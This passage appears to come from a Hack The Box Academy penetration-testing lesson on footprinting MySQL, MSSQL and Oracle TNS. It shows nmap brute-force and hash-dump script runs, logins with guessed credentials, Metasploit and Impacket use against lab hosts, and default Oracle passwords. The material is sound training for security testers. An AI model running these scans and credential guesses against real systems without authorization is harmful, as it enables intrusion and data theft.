<h3 id="dangerous-settings">Dangerous Settings</h3>
<p>Many things can be misconfigured with MySQL. We can look in more detail at the <a href="https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html">MySQL reference</a> to determine which options can be made in the server configuration. The main options that are security-relevant are:</p>
<table>
<thead>
<tr>
<th><strong>Settings</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>user</code></td>
<td>Sets which user the MySQL service will run as.</td>
</tr>
<tr>
<td><code>password</code></td>
<td>Sets the password for the MySQL user.</td>
</tr>
<tr>
<td><code>admin_address</code></td>
<td>The IP address on which to listen for TCP/IP connections on the administrative network interface.</td>
</tr>
<tr>
<td><code>debug</code></td>
<td>This variable indicates the current debugging settings</td>
</tr>
<tr>
<td><code>sql_warnings</code></td>
<td>This variable controls whether single-row INSERT statements produce an information string if warnings occur.</td>
</tr>
<tr>
<td><code>secure_file_priv</code></td>
<td>This variable is used to limit the effect of data import and export operations.</td>
</tr>
</tbody>
</table>
<p>The settings <code>user</code>, <code>password</code>, and <code>admin_address</code> are security-relevant because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. If we get another way to read files or even a shell, we can see the file and the username and password for the MySQL server. Suppose there are no other security measures to prevent unauthorized access. In that case, the entire database and all the existing customers&#39; information, email addresses, passwords, and personal data can be viewed and even edited.</p>
<p>The <code>debug</code> and <code>sql_warnings</code> settings provide verbose information output in case of errors, which are essential for the administrator but should not be seen by others. This information often contains sensitive content, which could be detected by trial and error to identify further attack possibilities. These error messages are often displayed directly on web applications. Accordingly, the SQL injections could be manipulated even to have the MySQL server execute system commands. This is discussed and shown in the module <a href="https://academy.hackthebox.com/course/preview/sql-injection-fundamentals">SQL Injection Fundamentals</a> and <a href="https://academy.hackthebox.com/course/preview/sqlmap-essentials">SQLMap Essentials</a>.</p>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>There are many reasons why a MySQL server could be accessed from an external network. Nevertheless, it is far from being one of the best practices, and we can always find databases that we can reach. Often, these settings were only meant to be temporary but were forgotten by the administrators. This server setup could also be used as a workaround due to a technical problem. Usually, the MySQL server runs on <code>TCP port 3306</code>, and we can scan this port with <code>Nmap</code> to get more detailed information.</p>
<p><strong>Scanning MySQL Server</strong></p>
<p>MySQL</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo <span class="hljs-keyword">nmap</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">14.128</span> -sV -sC -p3306 --script mysql*

Starting Nmap <span class="hljs-number">7.80</span> ( http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2021</span>-<span class="hljs-number">09</span>-<span class="hljs-number">21</span> <span class="hljs-number">00</span>:<span class="hljs-number">53</span> CEST
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">14.128</span>
Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.00021</span>s latency).

PORT     STATE SERVICE     VERSION
<span class="hljs-number">3306</span>/tcp <span class="hljs-keyword">open</span>  nagios-nsca Nagios NSCA
| mysql-brute: 
|   Account<span class="hljs-variable">s:</span> 
|     roo<span class="hljs-variable">t:</span><span class="hljs-symbol">&lt;empty&gt;</span> - Valid credentials
|_  Statistic<span class="hljs-variable">s:</span> Performed <span class="hljs-number">45010</span> guesses in <span class="hljs-number">5</span> seconds, average <span class="hljs-keyword">tp</span><span class="hljs-variable">s:</span> <span class="hljs-number">9002.0</span>
|_mysql-database<span class="hljs-variable">s:</span> ERROR: Script execution failed (use -d <span class="hljs-keyword">to</span> <span class="hljs-keyword">debug</span>)
|_mysql-dump-hashe<span class="hljs-variable">s:</span> ERROR: Script execution failed (use -d <span class="hljs-keyword">to</span> <span class="hljs-keyword">debug</span>)
| mysql-<span class="hljs-built_in">empty</span>-password: 
|_  root account <span class="hljs-built_in">has</span> <span class="hljs-built_in">empty</span> password
| mysql-enum: 
|   Valid username<span class="hljs-variable">s:</span> 
|     roo<span class="hljs-variable">t:</span><span class="hljs-symbol">&lt;empty&gt;</span> - Valid credentials
|     netadmin:<span class="hljs-symbol">&lt;empty&gt;</span> - Valid credentials
|     gues<span class="hljs-variable">t:</span><span class="hljs-symbol">&lt;empty&gt;</span> - Valid credentials
|     user:<span class="hljs-symbol">&lt;empty&gt;</span> - Valid credentials
|     we<span class="hljs-variable">b:</span><span class="hljs-symbol">&lt;empty&gt;</span> - Valid credentials
|     sysadmin:<span class="hljs-symbol">&lt;empty&gt;</span> - Valid credentials
|     administrator:<span class="hljs-symbol">&lt;empty&gt;</span> - Valid credentials
|     webadmin:<span class="hljs-symbol">&lt;empty&gt;</span> - Valid credentials
|     admin:<span class="hljs-symbol">&lt;empty&gt;</span> - Valid credentials
|     tes<span class="hljs-variable">t:</span><span class="hljs-symbol">&lt;empty&gt;</span> - Valid credentials
|_  Statistic<span class="hljs-variable">s:</span> Performed <span class="hljs-number">10</span> guesses in <span class="hljs-number">1</span> seconds, average <span class="hljs-keyword">tp</span><span class="hljs-variable">s:</span> <span class="hljs-number">10.0</span>
| mysql-info: 
|   Protoco<span class="hljs-variable">l:</span> <span class="hljs-number">10</span>
|   Version: <span class="hljs-number">8.0</span>.<span class="hljs-number">26</span>-<span class="hljs-number">0</span>ubuntu0.<span class="hljs-number">20.04</span>.<span class="hljs-number">1</span>
|   Thread ID: <span class="hljs-number">13</span>
|   Capabilities flag<span class="hljs-variable">s:</span> <span class="hljs-number">65535</span>
|   Some Capabilitie<span class="hljs-variable">s:</span> SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Statu<span class="hljs-variable">s:</span> Autocommit
|   Sal<span class="hljs-variable">t:</span> YTSgMfqvx\x0F\x7F\x16\&amp;\x1EAeK&gt;<span class="hljs-number">0</span>
|_  Auth Plugin Name: caching_sha2_password
|_mysql-user<span class="hljs-variable">s:</span> ERROR: Script execution failed (use -d <span class="hljs-keyword">to</span> <span class="hljs-keyword">debug</span>)
|_mysql-variable<span class="hljs-variable">s:</span> ERROR: Script execution failed (use -d <span class="hljs-keyword">to</span> <span class="hljs-keyword">debug</span>)
|_mysql-vuln-cve2012-<span class="hljs-number">2122</span>: ERROR: Script execution failed (use -d <span class="hljs-keyword">to</span> <span class="hljs-keyword">debug</span>)
MAC Addres<span class="hljs-variable">s:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> (VMware)

Service detection performed. Please report any incorrect results at http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">11.21</span> seconds
</code></pre>
<p>As with all our scans, we must be careful with the results and manually confirm the information obtained because some of the information might turn out to be a false-positive. This scan above is an excellent example of this, as we know for a fact that the target MySQL server does not use an empty password for the user <code>root</code>, but a fixed password. We can test this with the following command:</p>
<p><strong>Interaction with the MySQL Server</strong></p>
<p>MySQL</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ mysql -u root -h 10.129.14.132

<span class="hljs-keyword">ERROR </span>1045 (28000): Access denied for user 'root'@'10.129.14.1' (using password: NO)
</code></pre>
<p>For example, if we use a password that we have guessed or found through our research, we will be able to log in to the MySQL server and execute some commands.</p>
<p>MySQL</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> mysql -u root -pP4SSw0rd -h 10.129.14.128

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 150165
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)                                                         
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                                     
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                           

MySQL [(none)]&gt; show databases;                                                                          
+--------------------+
|<span class="hljs-string"> Database           </span>|
+--------------------+
|<span class="hljs-string"> information_schema </span>|
|<span class="hljs-string"> mysql              </span>|
|<span class="hljs-string"> performance_schema </span>|
|<span class="hljs-string"> sys                </span>|
+--------------------+
4 rows in set (0.006 sec)


MySQL [(none)]&gt; select version();
+-------------------------+
|<span class="hljs-string"> version()               </span>|
+-------------------------+
|<span class="hljs-string"> 8.0.27-0ubuntu0.20.04.1 </span>|
+-------------------------+
1 row in set (0.001 sec)


MySQL [(none)]&gt; use mysql;
MySQL [mysql]&gt; show tables;
+------------------------------------------------------+
|<span class="hljs-string"> Tables_in_mysql                                      </span>|
+------------------------------------------------------+
|<span class="hljs-string"> columns_priv                                         </span>|
|<span class="hljs-string"> component                                            </span>|
|<span class="hljs-string"> db                                                   </span>|
|<span class="hljs-string"> default_roles                                        </span>|
|<span class="hljs-string"> engine_cost                                          </span>|
|<span class="hljs-string"> func                                                 </span>|
|<span class="hljs-string"> general_log                                          </span>|
|<span class="hljs-string"> global_grants                                        </span>|
|<span class="hljs-string"> gtid_executed                                        </span>|
|<span class="hljs-string"> help_category                                        </span>|
|<span class="hljs-string"> help_keyword                                         </span>|
|<span class="hljs-string"> help_relation                                        </span>|
|<span class="hljs-string"> help_topic                                           </span>|
|<span class="hljs-string"> innodb_index_stats                                   </span>|
|<span class="hljs-string"> innodb_table_stats                                   </span>|
|<span class="hljs-string"> password_history                                     </span>|
...SNIP...
|<span class="hljs-string"> user                                                 </span>|
+------------------------------------------------------+
37 rows in set (0.002 sec)
</code></pre>
<p>If we look at the existing databases, we will see several already exist. The most important databases for the MySQL server are the <code>system schema</code> (<code>sys</code>) and <code>information schema</code> (<code>information_schema</code>). The system schema contains tables, information, and metadata necessary for management. More about this database can be found in the <a href="https://dev.mysql.com/doc/refman/8.0/en/system-schema.html">reference manual</a> of MySQL.</p>
<p>MySQL</p>
<pre><code class="lang-shell-session">mysql&gt; use sys;
mysql&gt; show tables;  

+-----------------------------------------------+
|<span class="hljs-string"> Tables_in_sys                                 </span>|
+-----------------------------------------------+
|<span class="hljs-string"> host_summary                                  </span>|
|<span class="hljs-string"> host_summary_by_file_io                       </span>|
|<span class="hljs-string"> host_summary_by_file_io_type                  </span>|
|<span class="hljs-string"> host_summary_by_stages                        </span>|
|<span class="hljs-string"> host_summary_by_statement_latency             </span>|
|<span class="hljs-string"> host_summary_by_statement_type                </span>|
|<span class="hljs-string"> innodb_buffer_stats_by_schema                 </span>|
|<span class="hljs-string"> innodb_buffer_stats_by_table                  </span>|
|<span class="hljs-string"> innodb_lock_waits                             </span>|
|<span class="hljs-string"> io_by_thread_by_latency                       </span>|
...SNIP...
|<span class="hljs-string"> x$waits_global_by_latency                     </span>|
+-----------------------------------------------+


mysql&gt; select host, unique_users from host_summary;

+-------------+--------------+                   
|<span class="hljs-string"> host        </span>|<span class="hljs-string"> unique_users </span>|<span class="hljs-string">                   
+-------------+--------------+                   
</span>|<span class="hljs-string"> 10.129.14.1 </span>|<span class="hljs-string">            1 </span>|<span class="hljs-string">                   
</span>|<span class="hljs-string"> localhost   </span>|<span class="hljs-string">            2 </span>|<span class="hljs-string">                   
+-------------+--------------+                   
2 rows in set (0,01 sec)</span>
</code></pre>
<p>The <code>information schema</code> is also a database that contains metadata. However, this metadata is mainly retrieved from the <code>system schema</code> database. The reason for the existence of these two is the ANSI/ISO standard that has been established. <code>System schema</code> is a Microsoft system catalog for SQL servers and contains much more information than the <code>information schema</code>.</p>
<p>Some of the commands we should remember and write down for working with MySQL databases are described below in the table.</p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>mysql -u &lt;user&gt; -p&lt;password&gt; -h &lt;IP address&gt;</code></td>
<td>Connect to the MySQL server. There should <strong>not</strong> be a space between the &#39;-p&#39; flag, and the password.</td>
</tr>
<tr>
<td><code>show databases;</code></td>
<td>Show all databases.</td>
</tr>
<tr>
<td><code>use &lt;database&gt;;</code></td>
<td>Select one of the existing databases.</td>
</tr>
<tr>
<td><code>show tables;</code></td>
<td>Show all available tables in the selected database.</td>
</tr>
<tr>
<td><code>show columns from &lt;table&gt;;</code></td>
<td>Show all columns in the selected database.</td>
</tr>
<tr>
<td><code>select * from &lt;table&gt;;</code></td>
<td>Show everything in the desired table.</td>
</tr>
<tr>
<td><code>select * from &lt;table&gt; where &lt;column&gt; = &quot;&lt;string&gt;&quot;;</code></td>
<td>Search for needed <code>string</code> in the desired table.</td>
</tr>
</tbody>
</table>
<p>We must know how to interact with different databases. Therefore, we recommend installing and configuring a MySQL server on one of our VMs for experimentation. There is also a widely covered <a href="https://dev.mysql.com/doc/refman/8.0/en/general-security-issues.html">security issues</a> section in the reference manual that covers best practices for securing MySQL servers. We should use this when setting up our MySQL server to understand better why something might not work.</p>
<h2 id="mssql">MSSQL</h2>
<hr>
<p><a href="https://www.microsoft.com/en-us/sql-server/sql-server-2019">Microsoft SQL</a> (<code>MSSQL</code>) is Microsoft&#39;s SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems. It is popular among database administrators and developers when building applications that run on Microsoft&#39;s .NET framework due to its strong native support for .NET. There are versions of MSSQL that will run on Linux and MacOS, but we will more likely come across MSSQL instances on targets running Windows.</p>
<p><strong>MSSQL Clients</strong></p>
<p><a href="https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15">SQL Server Management Studio</a> (<code>SSMS</code>) comes as a feature that can be installed with the MSSQL install package or can be downloaded &amp; installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Keep in mind that since SSMS is a client-side application, it can be installed and used on any system an admin or developer is planning to manage the database from. It doesn&#39;t only exist on the server hosting the database. This means we could come across a vulnerable system with SSMS with saved credentials that allow us to connect to the database. The image below shows SSMS in action.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/ssms.png" alt="SSMS"></p>
<p>Many other clients can be used to access a database running on MSSQL. Including but not limited to:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15">mssql-cli</a></td>
<td><a href="https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-ver15">SQL Server PowerShell</a></td>
<td><a href="https://www.heidisql.com/">HeidiSQL</a></td>
<td><a href="https://www.macsqlclient.com/">SQLPro</a></td>
<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py">Impacket&#39;s mssqlclient.py</a></td>
</tr>
</tbody>
</table>
<p>Of the MSSQL clients listed above, pentesters may find Impacket&#39;s mssqlclient.py to be the most useful due to SecureAuthCorp&#39;s Impacket project being present on many pentesting distributions at install. To find if and where the client is located on our host, we can use the following command:</p>
<p>MSSQL</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ locate mssqlclient

<span class="hljs-regexp">/usr/</span>bin/impacket-mssqlclient
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/doc/</span>python3-impacket<span class="hljs-regexp">/examples/</span>mssqlclient.py
</code></pre>
<p><strong>MSSQL Databases</strong></p>
<p>MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:</p>
<table>
<thead>
<tr>
<th>Default System Database</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>master</code></td>
<td>Tracks all system information for an SQL server instance</td>
</tr>
<tr>
<td><code>model</code></td>
<td>Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database</td>
</tr>
<tr>
<td><code>msdb</code></td>
<td>The SQL Server Agent uses this database to schedule jobs &amp; alerts</td>
</tr>
<tr>
<td><code>tempdb</code></td>
<td>Stores temporary objects</td>
</tr>
<tr>
<td><code>resource</code></td>
<td>Read-only database containing system objects included with SQL server</td>
</tr>
</tbody>
</table>
<p>Table source: <a href="https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15">System Databases Microsoft Doc</a></p>
<hr>
<h3 id="default-configuration">Default Configuration</h3>
<p>When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as <code>NT SERVICE\MSSQLSERVER</code>. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/auth.png" alt="SSMS"></p>
<p>Authentication being set to <code>Windows Authentication</code> means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment. Like with any OS, service, server role, or application, it can be beneficial to set it up in a VM from installation to configuration to understand all the default configurations and potential mistakes that the administrator could make.</p>
<hr>
<h3 id="dangerous-settings">Dangerous Settings</h3>
<p>It can be beneficial to place ourselves in the perspective of an IT administrator when we are on an engagement. This mindset can help us remember to look for various settings that may have been misconfigured or configured in a dangerous manner by an admin. A workday in IT can be rather busy, with lots of different projects happening simultaneously and the pressure to perform with speed &amp; accuracy being a reality in many organizations, mistakes can be easily made. It only takes one tiny misconfiguration that could compromise a critical server or service on the network. This applies to just about every network service and server role that can be configured, including MSSQL.</p>
<p>This is not an extensive list because there are countless ways MSSQL databases can be configured by admins based on the needs of their respective organizations. We may benefit from looking into the following:</p>
<ul>
<li>MSSQL clients not using encryption to connect to the MSSQL server</li>
<li>The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates</li>
<li>The use of <a href="https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15">named pipes</a></li>
<li>Weak &amp; default <code>sa</code> credentials. Admins may forget to disable this account</li>
</ul>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>There are many ways we can approach footprinting the MSSQL service, the more specific we can get with our scans, the more useful information we will be able to gather. NMAP has default mssql scripts that can be used to target the default tcp port <code>1433</code> that MSSQL listens on.</p>
<p>The scripted NMAP scan below provides us with helpful information. We can see the <code>hostname</code>, <code>database instance name</code>, <code>software version of MSSQL</code> and <code>named pipes are enabled</code>. We will benefit from adding these discoveries to our notes.</p>
<p><strong>NMAP MSSQL Script Scan</strong></p>
<p>MSSQL</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=<span class="hljs-number">1433</span>,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p <span class="hljs-number">1433</span> <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.248</span>

Starting Nmap <span class="hljs-number">7.91</span> ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2021-11-08 09:40 EST</span>
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.248</span>
Host is up (<span class="hljs-number">0.15</span>s latency).

PORT     STATE SERVICE  VERSION
<span class="hljs-number">1433</span>/tcp open  ms-sql-s Microsoft SQL Server <span class="hljs-number">2019</span> <span class="hljs-number">15.00</span><span class="hljs-number">.2000</span><span class="hljs-number">.00</span>; RTM
| ms-sql-ntlm-<span class="hljs-string">info:</span> 
|   <span class="hljs-string">Target_Name:</span> SQL<span class="hljs-number">-01</span>
|   <span class="hljs-string">NetBIOS_Domain_Name:</span> SQL<span class="hljs-number">-01</span>
|   <span class="hljs-string">NetBIOS_Computer_Name:</span> SQL<span class="hljs-number">-01</span>
|   <span class="hljs-string">DNS_Domain_Name:</span> SQL<span class="hljs-number">-01</span>
|   <span class="hljs-string">DNS_Computer_Name:</span> SQL<span class="hljs-number">-01</span>
|_  <span class="hljs-string">Product_Version:</span> <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span>

Host script <span class="hljs-string">results:</span>
| ms-sql-<span class="hljs-string">dac:</span> 
|_  <span class="hljs-string">Instance:</span> MSSQLSERVER; DAC <span class="hljs-string">port:</span> <span class="hljs-number">1434</span> (connection failed)
| ms-sql-<span class="hljs-string">info:</span> 
|   Windows server <span class="hljs-string">name:</span> SQL<span class="hljs-number">-01</span>
|   <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.248</span>\<span class="hljs-string">MSSQLSERVER:</span> 
|     Instance <span class="hljs-string">name:</span> MSSQLSERVER
|     <span class="hljs-string">Version:</span> 
|       <span class="hljs-string">name:</span> Microsoft SQL Server <span class="hljs-number">2019</span> RTM
|       <span class="hljs-string">number:</span> <span class="hljs-number">15.00</span><span class="hljs-number">.2000</span><span class="hljs-number">.00</span>
|       <span class="hljs-string">Product:</span> Microsoft SQL Server <span class="hljs-number">2019</span>
|       Service pack <span class="hljs-string">level:</span> RTM
|       Post-SP patches <span class="hljs-string">applied:</span> <span class="hljs-literal">false</span>
|     TCP <span class="hljs-string">port:</span> <span class="hljs-number">1433</span>
|     Named <span class="hljs-string">pipe:</span> \\<span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.248</span>\pipe\sql\query
|_    <span class="hljs-string">Clustered:</span> <span class="hljs-literal">false</span>

Service detection performed. Please report any incorrect results at <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org/submit/ .</span>
Nmap <span class="hljs-string">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">8.52</span> seconds
</code></pre>
<p>We can also use Metasploit to run an auxiliary scanner called <code>mssql_ping</code> that will scan the MSSQL service and provide helpful information in our footprinting process.</p>
<p><strong>MSSQL Ping in Metasploit</strong></p>
<p>MSSQL</p>
<pre><code class="lang-shell-session">msf6 auxiliary(scanner/mssql/mssql_ping) &gt; set rhosts <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.248</span>

rhosts =&gt; <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.248</span>


msf6 auxiliary(scanner/mssql/mssql_ping) &gt; run

[*] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.248</span>:       - SQL Server information for <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.248</span>:
[+] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.248</span>:       -    ServerName      = SQL-<span class="hljs-number">01</span>
[+] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.248</span>:       -    InstanceName    = MSSQLSERVER
[+] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.248</span>:       -    IsClustered     = No
[+] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.248</span>:       -    Version         = <span class="hljs-number">15.0</span><span class="hljs-meta">.2000</span><span class="hljs-meta">.5</span>
[+] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.248</span>:       -    tcp             = <span class="hljs-number">1433</span>
[+] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.248</span>:       -    np              = \\SQL-<span class="hljs-number">01</span>\pipe\sql\query
[*] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.248</span>:       - Scanned <span class="hljs-number">1</span> of <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span>% complete)
[*] Auxiliary module execution completed
</code></pre>
<p><strong>Connecting with Mssqlclient.py</strong></p>
<p>If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (<code>Transact-SQL</code>). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket&#39;s mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.</p>
<p>MSSQL</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3 mssqlclient.py Administrator@<span class="hljs-number">10.129</span>.<span class="hljs-number">201.248</span> -windows-auth

Impacket v0.<span class="hljs-number">9.22</span> - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation

Password:
[*] Encryption required, switching <span class="hljs-keyword">to</span> TLS
[*] ENVCHANGE(DATABASE): <span class="hljs-keyword">Old</span> Value: master, <span class="hljs-keyword">New</span> Value: master
[*] ENVCHANGE(LANGUAGE): <span class="hljs-keyword">Old</span> Value: , <span class="hljs-keyword">New</span> Value: us_english
[*] ENVCHANGE(PACKETSIZE): <span class="hljs-keyword">Old</span> Value: <span class="hljs-number">4096</span>, <span class="hljs-keyword">New</span> Value: <span class="hljs-number">16192</span>
[*] INFO(SQL-<span class="hljs-number">01</span>): Line <span class="hljs-number">1</span>: Changed database context <span class="hljs-keyword">to</span> <span class="hljs-string">'master'</span>.
[*] INFO(SQL-<span class="hljs-number">01</span>): Line <span class="hljs-number">1</span>: Changed language setting <span class="hljs-keyword">to</span> us_english.
[*] ACK: <span class="hljs-keyword">Result</span>: <span class="hljs-number">1</span> - Microsoft SQL Server (<span class="hljs-number">150</span> <span class="hljs-number">7208</span>) 
[!] Press help <span class="hljs-keyword">for</span> extra shell commands

SQL&gt; <span class="hljs-keyword">select</span> name <span class="hljs-keyword">from</span> sys.databases

name                                                                                                                               

--------------------------------------------------------------------------------------

master                                                                                                                             

tempdb                                                                                                                             

model                                                                                                                              

msdb                                                                                                                               

Transactions
</code></pre>
<h2 id="oracle-tns">Oracle TNS</h2>
<hr>
<p>The <code>Oracle Transparent Network Substrate</code> (<code>TNS</code>) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the <a href="https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html">Oracle Net Services</a> software suite, TNS supports various networking protocols between Oracle databases and client applications, such as <code>IPX/SPX</code> and <code>TCP/IP</code> protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.</p>
<p>Over time, TNS has been updated to support newer technologies, including <code>IPv6</code> and <code>SSL/TLS</code> encryption which makes it more suitable for the following purposes:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Name resolution</td>
<td>Connection management</td>
<td>Load balancing</td>
<td>Security</td>
</tr>
</tbody>
</table>
<p>Furthermore, it enables encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer. This feature helps secure the database architecture from unauthorized access or attacks that attempt to compromise the data on the network traffic. Besides, it provides advanced tools and capabilities for database administrators and developers since it offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.</p>
<hr>
<h3 id="default-configuration">Default Configuration</h3>
<p>The default configuration of the Oracle TNS server varies depending on the version and edition of Oracle software installed. However, some common settings are usually configured by default in Oracle TNS. By default, the listener listens for incoming connections on the <code>TCP/1521</code> port. However, this default port can be changed during installation or later in the configuration file. The TNS listener is configured to support various network protocols, including <code>TCP/IP</code>, <code>UDP</code>, <code>IPX/SPX</code>, and <code>AppleTalk</code>. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in <code>Oracle 8i</code>/<code>9i</code> but not in Oracle 10g/11g.</p>
<p>The default configuration of the TNS listener also includes a few basic security features. For example, the listener will only accept connections from authorized hosts and perform basic authentication using a combination of hostnames, IP addresses, and usernames and passwords. Additionally, the listener will use Oracle Net Services to encrypt the communication between the client and the server. The configuration files for Oracle TNS are called <code>tnsnames.ora</code> and <code>listener.ora</code> and are typically located in the <code>$ORACLE_HOME/network/admin</code> directory. The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol.</p>
<p>Oracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more. There have been made many changes for the default installation of Oracle services. For example, Oracle 9 has a default password, <code>CHANGE_ON_INSTALL</code>, whereas Oracle 10 has no default password set. The Oracle DBSNMP service also uses a default password, <code>dbsnmp</code> that we should remember when we come across this one. Another example would be that many organizations still use the <code>finger</code> service together with Oracle, which can put Oracle&#39;s service at risk and make it vulnerable when we have the required knowledge of a home directory.</p>
<p>Each database or service has a unique entry in the <a href="https://docs.oracle.com/cd/E11882\_01/network.112/e10835/tnsnames.htm#NETRF007">tnsnames.ora</a> file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. For example, a simple <code>tnsnames.ora</code> file might look like this:</p>
<p><strong>Tnsnames.ora</strong></p>
<p>Code: txt</p>
<pre><code class="lang-txt">ORCL =
  (<span class="hljs-name">DESCRIPTION</span> =
    (<span class="hljs-name">ADDRESS_LIST</span> =
